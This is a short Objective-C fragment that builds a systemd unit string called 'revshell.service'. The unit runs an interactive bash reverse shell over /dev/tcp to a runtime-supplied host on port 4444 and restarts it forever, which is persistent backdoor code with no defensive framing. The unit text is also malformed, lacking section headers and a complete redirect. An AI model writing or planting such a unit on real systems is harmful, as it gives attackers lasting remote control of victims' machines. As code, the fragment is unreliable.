#import <Foundation/Foundation.h>
NSString *unit = @"revshell.service\n"
                  "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/%s/4444'\n"
                  "Restart=always\n"
                  "WantedBy=default.target\n";
